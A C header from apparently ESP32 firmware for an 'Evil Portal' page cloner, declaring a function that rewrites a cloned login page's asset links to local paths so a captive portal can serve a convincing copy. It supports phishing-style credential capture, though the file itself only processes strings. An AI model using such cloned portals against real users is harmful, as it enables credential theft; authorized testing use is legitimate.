// Pure HTML asset-rewriter for the Evil Portal page cloner (F2) — no ESP-IDF, no networking, so it
// compiles into both the firmware and the host gate (portalclone-ctest.c). It turns a cloned page's
// SAME-ORIGIN asset references (the CSS/JS/images/fonts that give it its look) into short local paths
// the captive server can serve from SD, and reports the absolute URLs to fetch. FOR AUTHORIZED
// TESTING ONLY — string processing only, no requests are made here.
#pragma once
#include <stddef.h>
#ifdef __cplusplus
extern "C" {
#endif

#define EP_ASSET_MAX     16     // most login pages reference a handful of assets; cap hard
#define EP_ASSET_URL_MAX 192    // absolute URL we will fetch

typedef struct {
    char url[EP_ASSET_URL_MAX]; // absolute URL to download
    char local[16];             // local path it was rewritten to, e.g. "/a/3.css"
} ep_asset_t;

// Scan `html` (NUL-terminated, writable) for href="..."/src="..." references to SAME-ORIGIN static
// assets (css/js/png/jpg/jpeg/gif/svg/webp/ico/woff/woff2), REWRITE each in place to a short local
// path "/a/<k>.<ext>", and record the resolved absolute URL in assets[k]. `base_url` is the page's
// own absolute URL (scheme://host[/dir/file]), used both to resolve relative refs and to reject
// cross-origin ones. The rewrite only ever SHRINKS the buffer (a local path is shorter than any URL
// we match), so `html` is never grown and stays NUL-terminated. Returns the asset count (0..max,
// capped at EP_ASSET_MAX). Cross-origin, data:, javascript:, anchor, and unknown-extension refs are
// left untouched. Robust to missing base parts; returns 0 rather than misbehaving on bad input.
int ep_collect_assets(char *html, const char *base_url, ep_asset_t *assets, int max);

#ifdef __cplusplus
}
#endif
